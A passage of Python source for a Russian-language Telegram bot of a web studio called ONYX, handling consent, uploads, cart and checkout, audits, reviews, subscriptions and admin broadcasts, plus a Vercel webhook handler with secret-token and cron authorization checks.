        consent_save(uid, "pdn", True, user.get("username", ""))
        _del(f"onyx:docback:{uid}")
        answer_cb(cq["id"], "Спасибо!")
        edit_rich(chat_id, mid,
                  "✅ *Согласие принято.*\n\n" + INVOICE_EXPLAIN_MD + "\n\n**Вы физлицо или юрлицо?**", None,
                  {"inline_keyboard": [
                      [{"text": "👤 Физлицо", "callback_data": "pm:fiz"}],
                      [{"text": "🏢 Юрлицо / ИП", "callback_data": "pm:ur"}]]})
        log_event(uid, "consent_accepted", CONSENT_VERSION)
        lead_touch(uid, username=user.get("username"), action="requisites_started"); return
    # up:menu - та же кнопка «Загрузить материалы» из личного кабинета и из
    # экрана после анкеты. Обработчика для неё не было вовсе: нажатие просто
    # ничего не делало. Обрабатываем оба имени, чтобы старые сообщения
    # в истории чатов тоже заработали.
    if data in ("up:open", "up:menu"):
        answer_cb(cq["id"])
        edit_rich(chat_id, mid, upload_status_text(uid), None, upload_menu_kb()); return
    if data == "audit:plan":
        answer_cb(cq["id"])
        _a = user_get(uid) or {}
        send_rich(chat_id,
                  "# 🛠 Что с этим делать\n\n"
                  "Точный план зависит от вашей ниши и от того, откуда сейчас "
                  "приходят клиенты. Разберём это на бесплатной консультации: "
                  "полчаса, без обязательств.\n\n"
                  "Вы уйдёте с планом сайта, даже если делать будете не с нами.",
                  reply_markup=audit_plan_kb())
        return
    if data == "audit:again":
        answer_cb(cq["id"])
        state_set(uid, {"flow": "audit_url"})
        send(chat_id, "Пришлите адрес сайта - проверим его.",
             {"inline_keyboard": [nav_row(uid)]})
        return
    if data.startswith("up:cat:"):
        cat = data.split(":", 2)[2]
        if cat not in UPLOAD_CAT_RU:
            return
        state_set(uid, {"flow": "upload", "category": cat})
        answer_cb(cq["id"], UPLOAD_CAT_RU[cat])
        edit_rich(chat_id, mid,
                  f"## 📤 {UPLOAD_CAT_RU[cat]}\n\n"
                  "Присылайте файлы прямо в чат - можно несколько подряд.\n\n"
                  "> Каждый файл сразу попадёт в папку вашего проекта.", None,
                     {"inline_keyboard": [
                         [{"text": "➡️ Далее", "callback_data": "up:open"}],
                         [{"text": "✅ Всё прислал", "callback_data": "up:done"}]]})
        return
    if data == "up:done":
        state_del(uid)
        answer_cb(cq["id"], "Спасибо!")
        links = _get(f"onyx:drive:{uid}") or {}
        cnt = sum((links.get("counts") or {}).values())
        rows = [[{"text": "📎 Добавить ещё", "callback_data": "up:open"}],
                [{"text": "🏠 В меню", "callback_data": "b:home"}]]
        edit_or_send(chat_id, mid,
                     (f"✅ <b>Готово! Получили {cnt} файл(ов).</b>\n\n"
                      "Всё лежит в папке вашего проекта - используем при сборке сайта."
                      if cnt else "Хорошо! Материалы можно прислать в любой момент - "
                                  "они пригодятся на этапе сборки сайта."),
                     {"inline_keyboard": rows})
        if cnt:
            notify_admins(f"📎 <b>Клиент прислал материалы</b>\nid {uid} · всего {cnt} файл(ов)\n"
                          + (links.get("folder_url") or "папка не создана"))
        return
    if data == "doc:from_consent":
        # запоминаем, что клиент пришёл из гейта согласия - иначе он там застрянет
        _set(f"onyx:docback:{uid}", "consent", ttl=3600)
        edit_rich(chat_id, mid, DOCS_TEXT, None, docs_kb("consent")); return
    if data == "doc:home":
        back = _get(f"onyx:docback:{uid}")
        edit_rich(chat_id, mid, DOCS_TEXT, None, docs_kb(back)); return
    if data == "doc:my":
        edit_rich(chat_id, mid, my_data_text(uid), None, my_data_kb(uid)); return
    if data == "doc:sub":
        consent_save(uid, "marketing", True, user.get("username", ""))
        answer_cb(cq["id"], "Подписаны")
        edit_or_send(chat_id, mid, "🔔 Готово! Будем присылать только полезное. "
                                   "Отписаться можно здесь же в любой момент.", my_data_kb(uid)); return
    if data == "doc:unsub":
        consent_revoke(uid, "marketing", user.get("username", ""))
        l = lead_get(uid)
        if l:
            l["followups_off"] = True; lead_save(l)
        answer_cb(cq["id"], "Отписали")
        edit_or_send(chat_id, mid, "🔕 Отписали от рекламных сообщений. "
                                   "Уведомления по вашему заказу продолжат приходить.",
                     my_data_kb(uid)); return
    if data == "doc:erase":
        answer_cb(cq["id"])
        uname = f"@{user.get('username')}" if user.get("username") else "-"
        try:
            create_task("support", uid, f"Запрос на удаление персональных данных (id {uid})",
                        description="Обработать в течение 10 рабочих дней. Проверить основания "
                                    "для дальнейшего хранения (действующий договор, документы по расчётам).",
                        telegram_id=uid, priority="high", notify=True)
        except Exception as e:
            print("erase task err", e)
        notify_admins(f"🗑 <b>Запрос на удаление данных</b>\n{uname} (id {uid})\n"
                      "Срок ответа - 10 рабочих дней (152-ФЗ).")
        edit_or_send(chat_id, mid,
                     "🗑 <b>Запрос принят</b>\n\n"
                     "Рассмотрим и ответим в течение 10 рабочих дней.\n\n"
                     "<i>Обратите внимание: часть данных мы обязаны хранить по закону - "
                     "например, документы по расчётам в течение 4 лет. О том, что именно "
                     "удалено, сообщим отдельно.</i>",
                     {"inline_keyboard": [[{"text": "⬅️ К документам", "callback_data": "doc:home"}]]}); return
    if data.startswith("doc:"):
        key = data.split(":", 1)[1]
        titles = {"privacy": "Политика конфиденциальности", "pdn": "Политика обработки персональных данных",
                  "consent": "Согласие на обработку персональных данных",
                  "terms": "Пользовательское соглашение", "offer": "Публичная оферта"}
        if key not in titles:
            return
        edit_or_send(chat_id, mid,
                     f"📄 <b>{titles[key]}</b>\n\n"
                     "Документ ещё не опубликован на сайте. "
                     f"Запросите актуальную редакцию: {ONYX_EMAIL}",
                     {"inline_keyboard": [[{"text": "⬅️ К документам", "callback_data": "doc:home"}]]}); return

    # --- Этап 3: услуги, карточки, корзина, оформление ---
    if data == "svc:list":
        ensure_mandatory(uid)
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=services_list_text(uid),
           parse_mode="HTML", reply_markup=services_list_kb(uid))
        return
    if data.startswith("svc:v:"):
        cid = data.split(":", 2)[2]
        if cid not in SERVICE:
            return
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=service_card_text(cid, uid),
           parse_mode="HTML", reply_markup=service_card_kb(cid, uid))
        return
    if data.startswith("svc:add:"):
        cid = data.split(":", 2)[2]
        if cid not in SERVICE:
            return
        cart = cart_get(uid)
        if cid not in cart:
            cart.append(cid); cart_set(uid, cart)
            log_event(uid, "service_add", cid)
        edit_or_send(chat_id, mid, added_text(cid), added_kb(cid))
        return
    if data.startswith("svc:del:"):
        cid = data.split(":", 2)[2]
        if cid in mandatory_ids(uid):
            answer_cb(cq["id"], "Эту услугу нельзя убрать"); return
        cart = cart_get(uid)
        if cid in cart:
            cart.remove(cid); cart_set(uid, cart)
        cm = cart_comments_get(uid)
        if cid in cm:
            cm.pop(cid); cart_comments_set(uid, cm)
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=service_card_text(cid, uid),
           parse_mode="HTML", reply_markup=service_card_kb(cid, uid))
        return
    if data.startswith("svc:cm:"):
        cid = data.split(":", 2)[2]
        if cid not in SERVICE:
            return
        state_set(uid, {"flow": "svc_comment", "id": cid})
        s = SERVICE.get(cid, {})
        send(chat_id, f"✍️ Напишите комментарий к услуге «{s.get('name', '')}» одним сообщением.\n\n"
                      "Например: «Нужно добавить страницы: О компании, Услуги, Контакты, Галерея.»",
             {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
        return
    if data == "cart:show":
        edit_or_send(chat_id, mid, cart_show_text(uid), cart_show_kb(uid))
        return
    if data == "cart:clear":
        mand = mandatory_ids(uid)
        cart_set(uid, [c for c in cart_get(uid) if c in mand])
        cart_comments_set(uid, {c: v for c, v in cart_comments_get(uid).items() if c in mand})
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=cart_show_text(uid),
           parse_mode="HTML", reply_markup=cart_show_kb(uid))
        return
    if data == "cart:checkout":
        checkout(chat_id, user, uid, mid=mid)
        return
    if data.startswith("ord:pay:"):
        parts = data.split(":", 3)
        if len(parts) == 4:
            order_pay_method(chat_id, uid, parts[3], parts[2])
        return

    # --- Реестр аудитов: обновить / показать прежний ---
    if data.startswith("audit:refresh:"):
        domain = data.split(":", 2)[2]
        answer_cb(cq["id"], "Обновляю аудит…")
        audit_start(chat_id, uid, "https://" + domain, username=user.get("username", ""), force=True)
        return
    if data.startswith("audit:show:"):
        try:
            a = audit_get(int(data.split(":")[2]))
        except Exception:
            a = None
        if a:
            resend_audit(chat_id, uid, a)
        return

    # --- Этап 5: раздел «Мой заказ» ---
    if data == "audit:offer":
        p = user_get(uid) or {}
        uname = f"@{user.get('username')}" if user.get("username") else "-"
        log_event(uid, "offer_requested")
        lead_touch(uid, username=user.get("username"), action="offer_requested", offer=True)
        recompute_tags(uid)
        notify_admins("📩 <b>Запрос предложения после аудита</b> 🔥\n"
                      f"Клиент: {p.get('name', '-')}\nTelegram: {uname} (id {uid})\n"
                      f"Контакт: {p.get('contact', '-')}")
        o = offer_get(uid)
        if o:
            o["offer_status"] = "client_interested"; offer_save(o)
        create_task("audit", offer_get(uid).get("offer_id", uid) if offer_get(uid) else uid,
                    "Подготовить предложение по аудиту", telegram_id=uid, priority="high", notify=False)
        send(chat_id, "Отлично. Мы подготовим предложение по улучшению сайта и свяжемся с вами.", MAIN_MENU)
        return
    if data == "audit:fix":
        o = offer_get(uid)
        rec = []
        if o and o.get("recommended_services"):
            rec = [NAME_TO_ID.get(n.strip()) for n in o["recommended_services"].split(",")]
            rec = [r for r in rec if r]
        cart = cart_get(uid)
        for cid in rec:
            if cid not in cart:
                cart.append(cid)
        cart_set(uid, cart)
        if o:
            o["offer_status"] = "client_interested"; offer_save(o)
        ensure_mandatory(uid)
        msg_txt = ("🛠 Добавили рекомендованные услуги в корзину." if rec
                   else "Выберите нужные услуги в каталоге - и оформим исправления.")
        if not anketa_done(uid):
            msg_txt += "\n\nЧтобы оформить заказ, сначала заполните короткую анкету."
        send(chat_id, msg_txt, services_list_kb(uid))
        return

    if data == "myorder:open":
        txt, kb = render_my_order(uid)
        edit_or_send(chat_id, mid, txt, kb); return
    if data == "myorder:ok":
        answer_cb(cq["id"], "Отлично! Мы на связи 🤝"); return
    if data == "myorder:changes":
        state_set(uid, {"flow": "client_changes"})
        send(chat_id, "✏️ <b>Отправьте все правки одним сообщением.</b>\n\n"
                      "Опишите списком, что поменять: тексты, блоки, фото, цвета. "
                      "Мы внесём их единым пакетом - так быстрее и без потерь.",
             {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}); return
    if data == "myorder:dev":
        answer_cb(cq["id"], f"Разработчик: @{DEVELOPER_USERNAME}"); return
    if data == "myorder:support":
        edit_or_send(chat_id, mid, SUPPORT_TEXT, support_kb()); return
    if data.startswith("myorder:urgent:"):
        try:
            oid = int(data.split(":")[2])
        except Exception:
            return
        request_urgent(chat_id, user, uid, oid); return

    # --- Этап 5: смена статуса админом через inline-кнопки ---
    if data.startswith("setstatus:"):
        if not is_admin(uid):
            answer_cb(cq["id"], "Недоступно"); return
        _, oid_s, key = data.split(":", 2)
        if key not in PROJECT_STATUS:
            answer_cb(cq["id"], "Неизвестный статус"); return
        o = apply_project_status(int(oid_s), key)
        if not o:
            answer_cb(cq["id"], "Заказ не найден"); return
        answer_cb(cq["id"], f"Статус: {PROJECT_STATUS[key]['label']}")
        tg("editMessageText", chat_id=chat_id, message_id=mid,
           text=f"✅ Заказ №{oid_s} → {ps_label(key)}. Клиент уведомлён.", parse_mode="HTML")
        return
    if data == "cab:profile":
        send(chat_id, render_profile(uid), MAIN_MENU); return
    if data == "cab:orders":
        txt, kb = render_orders(uid)
        send(chat_id, txt, kb or MAIN_MENU); return
    if data == "cab:review":
        open_review_section(chat_id, uid, user.get("username", "")); return
    if data == "cab:support":
        edit_or_send(chat_id, mid, SUPPORT_TEXT, support_kb()); return
    if data == "cab:info":
        edit_or_send(chat_id, mid, content_text(uid), content_kb(uid)); return

    # --- Этап 10: подписка на темы ---
    if data.startswith("ct:t:"):
        topic = data.split(":", 2)[2]
        if topic not in TOPICS:
            return
        csub_toggle(uid, topic)
        answer_cb(cq["id"], "Обновлено")
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=content_text(uid),
           parse_mode="HTML", reply_markup=content_kb(uid))
        return
    if data == "ct:all":
        csub_all_topics(uid)
        answer_cb(cq["id"], "Подписка на все темы")
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=content_text(uid),
           parse_mode="HTML", reply_markup=content_kb(uid))
        return
    if data == "cons:phone":
        answer_cb(cq["id"])
        state_set(uid, {"flow": "cons_phone"})
        send(chat_id,
             "📱 Оставьте номер - на случай, если в Telegram не достучимся.\n\n"
             "<i>Звоним только по делу и только в оговорённое время. "
             "Не хотите - просто нажмите «Не сейчас», ничего не изменится.</i>",
             {"keyboard": [[{"text": "📱 Отправить мой номер", "request_contact": True}],
                           [{"text": "Не сейчас"}]],
              "resize_keyboard": True, "one_time_keyboard": True})
        return
    if data == "ct:done":
        st_sub = csub_ensure(uid)
        picked = [t for t in (st_sub.get("topics") or []) if t in TOPICS]
        answer_cb(cq["id"], "Подписка оформлена")
        log_event(uid, "digest_subscribed", ",".join(picked))
        names = "\n".join(f"- {TOPICS[t].split(' ', 1)[1]}" for t in picked)
        edit_rich(chat_id, mid,
                  "# ✅ Подписка оформлена\n\n"
                  f"Будем присылать материалы по темам:\n\n{names}\n\n"
                  "Не чаще раза в неделю. Передумаете - отпишетесь одной кнопкой "
                  "в личном кабинете.",
                  None,
                  {"inline_keyboard": [
                      [{"text": "📦 Статус заказа", "callback_data": "cab:orders"}],
                      [{"text": "📎 Дослать материалы", "callback_data": "up:open"}],
                      [{"text": "⚙️ Изменить темы", "callback_data": "cab:info"}],
                      [{"text": "🏠 В меню", "callback_data": "b:home"}]]})
        return
    if data == "ct:skip":
        answer_cb(cq["id"])
        edit_rich(chat_id, mid,
                  "# Хорошо, писем не будет\n\n"
                  "Если передумаете - темы всегда можно выбрать в личном кабинете.",
                  None,
                  {"inline_keyboard": [
                      [{"text": "👤 Личный кабинет", "callback_data": "b:cab"}],
                      [{"text": "🏠 В меню", "callback_data": "b:home"}]]})
        return
    if data == "ct:off":
        csub_unsubscribe(uid)
        answer_cb(cq["id"], "Вы отписались")
        edit_rich(chat_id, mid,
                  "# 🔕 Отписали\n\nБольше писем присылать не будем.\n\n"
                  "Вернуться можно в любой момент: личный кабинет, «Полезные письма».",
                  None,
                  {"inline_keyboard": [
                      [{"text": "👤 Личный кабинет", "callback_data": "b:cab"}],
                      [{"text": "🏠 В меню", "callback_data": "b:home"}]]})
        return

    # --- Этап 10: админ-рассылка ---
    if data.startswith("bc:new:"):
        if not is_admin(uid):
            return
        topic = data.split(":", 2)[2]
        state_set(uid, {"flow": "bc_text", "topic": topic})
        send(chat_id, f"✍️ Тема: <b>{TOPICS.get(topic, topic)}</b>\n"
                      f"Получателей: {len(topic_subscribers(topic))}\n\n"
                      "Пришлите текст рассылки одним сообщением.",
             {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
        return
    if data.startswith("bc:ai:"):
        if not is_admin(uid):
            return
        topic = data.split(":", 2)[2]
        send(chat_id, "🤖 Генерирую черновик…")
        draft = ai_draft_post(topic)
        bc_preview(chat_id, uid, topic, draft)
        return
    if data == "bc:send":
        if not is_admin(uid):
            return
        st = state_get(uid)
        if not st or st.get("flow") != "bc_confirm":
            send(chat_id, "Рассылка не найдена. Начните заново: /post"); return
        state_del(uid)
        b = bc_create(st["topic"], st["text"], uid)
        total = len(b.get("queue") or [])
        if not total:
            b["status"] = "done"; bc_save(b)
            send(chat_id, "На эту тему пока нет подписчиков.", MAIN_MENU); return
        send(chat_id, f"🚀 Рассылка №{b['broadcast_id']} запущена: {total} получателей…")
        sent, rest = bc_send_batch(b["broadcast_id"])
        if rest:
            send(chat_id, f"✅ Отправлено {sent}. Осталось {rest} - дошлём автоматически.", MAIN_MENU)
        else:
            bb = bc_get(b["broadcast_id"])
            send(chat_id, f"✅ Рассылка №{b['broadcast_id']} завершена.\n"
                          f"Отправлено: {bb['sent_count']} · Ошибок: {bb['failed_count']}", MAIN_MENU)
        return
    if data == "bc:cancel":
        state_del(uid)
        send(chat_id, "Рассылка отменена.", MAIN_MENU); return
    if data == "pt:apply":
        if partner_get(uid):
            send(chat_id, render_partner_status(partner_get(uid)), MAIN_MENU); return
        state_set(uid, {"flow": "partner", "i": 0, "data": {}})
        send_partner_step(chat_id, state_get(uid))
        return
    if data == "pt:how":
        edit_or_send(chat_id, mid, PARTNER_HOW,
             {"inline_keyboard": [[{"text": "✍️ Оставить заявку партнёра", "callback_data": "pt:apply"}],
                                  [{"text": "🏠 Назад в меню", "callback_data": "b:home"}]]})
        return
    if data.startswith("pt:hc:"):
        st = state_get(uid)
        if not st or st.get("flow") != "partner":
            return
        try:
            opt = HAS_CLIENTS_OPTS[int(data.split(":")[2])]
        except Exception:
            return
        answer_cb(cq["id"], opt)
        partner_step_next(chat_id, user, st, opt)
        return
    if data == "pt:start":  # обратная совместимость со старой кнопкой
        state_set(uid, {"flow": "partner", "i": 0, "data": {}})
        send_partner_step(chat_id, state_get(uid))
        return
    # --- Этап 8: сценарий отзыва ---
    if data.startswith("rev:begin:"):
        oid_s = data.split(":", 2)[2]
        order_id = int(oid_s) if oid_s.isdigit() and oid_s != "0" else (last_completed_order(uid) or {}).get("id")
        review_start(chat_id, uid, user.get("username", ""), order_id=order_id, intro=False)
        return
    if data.startswith("rev:rate:"):
        st = state_get(uid) or {}
        rid = st.get("rid")
        r = review_get(rid) if rid else None
        if not r:
            r = review_new(uid, user.get("username", ""), (last_completed_order(uid) or {}).get("id"))
            rid = r["review_id"]
        try:
            n = int(data.split(":")[2])
        except Exception:
            return
        r["rating"] = n
        r["status"] = "rated"
        review_save(r, to_sheet=False)
        answer_cb(cq["id"], f"Оценка {n}/5 - спасибо!")
        tg("editMessageText", chat_id=chat_id, message_id=mid,
           text=f"Ваша оценка: <b>{'⭐' * n}</b> ({n}/5)", parse_mode="HTML")
        review_ask_text(chat_id, uid, rid)
        return
    if data == "rev:text":
        st = state_get(uid) or {}
        state_set(uid, {"flow": "review", "step": "text", "rid": st.get("rid")})
        send(chat_id, "Напишите, пожалуйста, ваш отзыв одним сообщением 👇",
             {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
        return
    if data == "rev:skip_text":
        st = state_get(uid) or {}
        review_ask_video(chat_id, uid, st.get("rid"))
        return
    if data == "rev:video":
        st = state_get(uid) or {}
        state_set(uid, {"flow": "review", "step": "video", "rid": st.get("rid")})
        send(chat_id, "Запишите видеокружок и отправьте его сюда 👇\n"
                      "<i>(в Telegram: нажмите на иконку микрофона и переключите её на камеру)</i>",
             {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
        return
    if data == "rev:skip_video":
        st = state_get(uid) or {}
        review_preview(chat_id, uid, st.get("rid"))
        return
    if data == "rev:publish":
        st = state_get(uid) or {}
        answer_cb(cq["id"], "Отправлено!")
        review_submit(chat_id, uid, st.get("rid"))
        return
    if data == "rev:redo":
        st = state_get(uid) or {}
        rid = st.get("rid")
        answer_cb(cq["id"], "Хорошо, поставьте оценку заново")
        state_set(uid, {"flow": "review", "step": "rate", "rid": rid})
        send(chat_id, "Поставьте оценку нашей работе:", rating_kb())
        return
    if data == "rev:cancel":
        st = state_get(uid) or {}
        answer_cb(cq["id"], "Отменено")
        review_cancel(chat_id, uid, st.get("rid"))
        return
    if data.startswith("rev:adm:"):
        if not is_admin(uid):
            answer_cb(cq["id"], "Недоступно"); return
        parts = data.split(":")
        act = parts[2]
        try:
            rid = int(parts[3])
        except Exception:
            return
        r = review_get(rid)
        if not r:
            answer_cb(cq["id"], "Отзыв не найден"); return
        if act == "approve":
            r["status"] = "approved"; review_save(r)
            answer_cb(cq["id"], "Одобрено ✅")
            send(chat_id, f"✅ Отзыв review_id {rid} одобрен и опубликован в «⭐ Отзывы ONYX».")
            safe_send(r["telegram_id"], "🎉 Ваш отзыв опубликован на канале ONYX! Спасибо, что поделились впечатлениями 🙏")
        elif act == "reject":
            r["status"] = "rejected"; review_save(r)
            answer_cb(cq["id"], "Отклонено")
            send(chat_id, f"❌ Отзыв review_id {rid} отклонён.")
            safe_send(r["telegram_id"], "Спасибо за отзыв! На этот раз мы не будем публиковать его на канале, "
                                        "но обязательно учтём вашу обратную связь 🤝")
        elif act == "edit":
            state_set(uid, {"flow": "rev_admin_edit", "rid": rid})
            answer_cb(cq["id"])
            send(chat_id, f"✍️ Пришлите новый текст отзыва (review_id {rid}) одним сообщением:",
                 {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
        return

    if data == "b:noop":
        return

    # анкета - выбор варианта / навигация / резюме (всё редактируется в одном сообщении)
    if (data in ("b:back", "b:skip", "b:cancel", "b:ok", "b:redo", "b:mdone")
            or data.startswith("b:o:") or data.startswith("b:m:")):
        st = state_get(uid)
        if not st or st.get("flow") != "brief":
            return
        if not st.get("mid"):
            st["mid"] = mid
        if data == "b:cancel":
            state_del(uid)
            tg("editMessageText", chat_id=chat_id, message_id=st["mid"],
               text="Заполнение анкеты отменено. Вы можете вернуться к ней в любой момент.")
            main_menu(chat_id, "Выберите, что дальше 👇")
            return
        if data == "b:ok":
            d = st.get("data", {})
            fmid = st.get("mid")
            state_del(uid); finish_brief(chat_id, user, d, mid=fmid); return
        if data == "b:redo":
            st = {"flow": "brief", "i": 0, "data": {}, "mid": st.get("mid"),
                  "steps": st.get("steps")}
            brief_push(chat_id, uid, st); return
        if data == "b:back":
            st.pop("stage", None)
            st["i"] = max(0, min(st["i"], len(steps_of(st))) - 1)
            brief_push(chat_id, uid, st); return
        # b:skip / b:o:idx / b:m:idx / b:mdone - только на активном вопросе
        if st.get("stage") == "summary" or st["i"] >= len(steps_of(st)):
            return
        step = steps_of(st)[st["i"]]
        # --- мультивыбор: переключение галочки без перехода к следующему вопросу ---
        if data.startswith("b:m:"):
            if not step.get("multi"):
                return
            try:
                idx = int(data.split(":")[2])
                k = step["multi"][idx][0]
            except Exception:
                return
            st["data"][k] = "Нет" if st["data"].get(k) == "Да, есть" else "Да, есть"
            brief_push(chat_id, uid, st)
            return
        if data == "b:mdone":
            if not step.get("multi"):
                return
            for k, _lbl in step["multi"]:          # неотмеченное - явное «Нет»
                st["data"].setdefault(k, "Нет")
            st["data"][step["key"]] = ", ".join(
                lbl for k, lbl in step["multi"] if st["data"].get(k) == "Да, есть") or "нет материалов"
            st["i"] += 1
            brief_advance(chat_id, user, uid, st)
            return
        if data == "b:skip":
            if not step.get("opt"):
                return
            st["data"][step["key"]] = ""
        else:
            # защита от «залипшей» старой клавиатуры: кнопка варианта на шаге,
            # где вариантов нет (например, вернулись назад на текстовый вопрос)
            opts = step.get("opts")
            if not opts:
                brief_push(chat_id, uid, st)
                return
            try:
                idx = int(data.split(":")[2])
                val = opts[idx]
            except (ValueError, IndexError):
                brief_push(chat_id, uid, st)
                return
            brief_flash_choice(chat_id, st, idx)
            st["data"][step["key"]] = val
        st["i"] += 1
        brief_advance(chat_id, user, uid, st)
        return

    # корзина
    if data.startswith("c:"):
        action = data[2:]
        cart = cart_get(uid)
        if action == "info":
            send(chat_id, services_info_text()); return
        if action == "clear":
            cart = []
        elif action == "pay":
            if not cart:
                answer_cb(cq["id"], "Сначала выберите услуги"); return
            if not anketa_done(uid):
                send(chat_id, "Для оформления заказа сначала нужно зарегистрировать личный кабинет и "
                              "заполнить анкету на разработку сайта. Это поможет нам корректно подготовить "
                              "сайт под ваш бизнес.",
                     {"inline_keyboard": [[{"text": "📝 Заполнить анкету", "callback_data": "brief:start"}]]}); return
            log_event(uid, "requisites_started")
            lead_touch(uid, username=user.get("username"), action="requisites_started")
            send(chat_id, "📝 <b>Оформление заявки.</b> Реквизиты нужны для будущего официального счёта "
                          "(он выставляется через «Мой налог» уже <b>после</b> того, как вы утвердите готовый сайт).\n\n"
                          "Вы физлицо или юрлицо?", {"inline_keyboard": [
                [{"text": "👤 Физлицо", "callback_data": "pm:fiz"}],
                [{"text": "🏢 Юрлицо / ИП", "callback_data": "pm:ur"}],
            ]}); return
        else:
            if action in ITEM:
                cart.remove(action) if action in cart else cart.append(action)
            else:
                return
        cart_set(uid, cart)
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=cart_text(cart),
           parse_mode="HTML", reply_markup=cart_kb(cart))
        return

    # способ оплаты - только счёт (физлицо / юрлицо)
    if data in ("pm:fiz", "pm:ur"):
        cart = cart_get(uid)
        _p = user_get(uid) or {}
        # заявка возможна если выбран тариф ИЛИ есть опции в корзине
        if not cart and not _p.get("chosen_tariff"):
            answer_cb(cq["id"], "Сначала выберите тариф или услуги")
            send(chat_id, "Сначала выберите тариф или доп. опции.",
                 {"inline_keyboard": [[{"text": "📦 Тарифы", "callback_data": "tariffs:list"}],
                                      [{"text": "➕ Доп. опции", "callback_data": "options:list"}]]}); return
        # защита от двойного тапа
        lock = f"onyx:order_lock:{uid}"
        if _get(lock):
            answer_cb(cq["id"], "Уже оформляем, секунду…"); return
        _set(lock, 1, ttl=8, immediate=True)
        if not anketa_done(uid):
            answer_cb(cq["id"])
            send(chat_id, "Для оформления заказа сначала заполните анкету.",
                 {"inline_keyboard": [[{"text": "📝 Заполнить анкету", "callback_data": "brief:start"}]]}); return
        start_cap(chat_id, uid, "legal" if data == "pm:ur" else "individual", cart=cart)
        return


def process_update(update):
    """Обработать апдейт и только ПОТОМ выгрузить накопленное в таблицу.
    Запись в Google Sheets - самая медленная операция, и клиенту она не нужна:
    он уже получил ответ. Держим её строго после работы с пользователем."""
    req_cache_begin()
    try:
        if update.get("callback_query"):
            process_callback(update["callback_query"])
        else:
            msg = update.get("message") or update.get("edited_message")
            if msg:
                process_message(msg)
    finally:
        flush_kv()        # сначала данные - это источник правды
        flush_sheets()    # потом зеркало в таблице
        req_cache_end()


# ------------------------- Vercel handler -------------------------
check_env()   # один раз при холодном старте функции


class handler(BaseHTTPRequestHandler):
    def _ok(self, body=b"ok", code=200):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        # Ответ функции никогда не должен интерпретироваться браузером как разметка.
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _cron_allowed(self):
        """Крон запускает рассылку по всей базе, поэтому вызывать его может
        только планировщик. Vercel подставляет `Authorization: Bearer $CRON_SECRET`
        сам, если переменная задана в проекте.

        Если секрет не задан - не выполняем ничего. Это осознанный отказ:
        молчащие автодожимы заметны и чинятся за минуту, а открытый крон
        позволяет любому человеку разослать сообщения всем клиентам."""
        if not CRON_SECRET:
            log_error("cron", "CRON_SECRET не задан - плановые задачи отключены", notify=True)
            return False
        got = self.headers.get("Authorization", "")
        return secrets.compare_digest(got, "Bearer " + CRON_SECRET)

    def do_GET(self):
        # Раньше путь проверялся вхождением подстроки, и запрос вида
        # /что-угодно?x=cron тоже запускал рассылку. Теперь сравниваем сам
        # путь целиком, отбросив строку запроса.
        route = urllib.parse.urlparse(self.path or "").path.rstrip("/").lower()
        if route in ("/cron", "/api/cron", "/api/index"):
            if not self._cron_allowed():
                self._ok(b"forbidden", 403); return
            try:
                n = 0
                try:
                    n += run_pending_audits()
                except Exception as e:
                    print("audits cron err", e)
                try:
                    n += run_pending_broadcasts()
                except Exception as e:
                    print("broadcasts cron err", e)
                try:
                    n += run_followups()
                except Exception as e:
                    print("followups cron err", e)
            except Exception as e:
                print("cron err", e); n = -1
            finally:
                flush_kv()
                flush_sheets()   # у крона нет клиента - просто дописываем очередь
            self._ok(f"cron ok: {n}".encode("utf-8")); return
        self._ok("ONYX bot webhook is running".encode("utf-8"))

    def do_POST(self):
        length = int(self.headers.get("content-length", 0) or 0)
        # Тело апдейта Telegram - это десятки килобайт максимум. Всё, что больше,
        # читать не станем: незачем принимать мегабайты от кого попало.
        if length > MAX_BODY_BYTES:
            self._ok(b"too large", 413); return
        raw = self.rfile.read(length) if length else b""

        # --- Telegram webhook ---
        # Тело запроса полностью контролируется отправителем, включая from.id.
        # Поэтому доверять ему как источнику личности можно ТОЛЬКО после проверки
        # секретного заголовка, который Telegram шлёт при регистрации вебхука.
        got = self.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
        if WEBHOOK_SECRET:
            # Сравниваем за постоянное время: обычное != подсказывает длину совпадения.
            if not secrets.compare_digest(got, WEBHOOK_SECRET):
                self._ok(b"forbidden", 403); return
            trusted = True
        else:
            # Секрет не задан. Раньше в этом случае проверка просто пропускалась,
            # и кто угодно мог прислать апдейт с чужим from.id - в том числе
            # админским, получив полный доступ к рассылкам и статусам.
            # Теперь клиентская часть продолжает работать, а административная
            # выключается до тех пор, пока источник нельзя подтвердить.
            trusted = False
            _warn_webhook_unverified()

        _REQUEST_TRUSTED[0] = trusted
        try:
            process_update(json.loads(raw or b"{}"))
        except Exception as e:
            log_error("handler", e, notify=True)
        finally:
            _REQUEST_TRUSTED[0] = True   # вне HTTP-контекста (крон, тесты) доверяем
        self._ok()
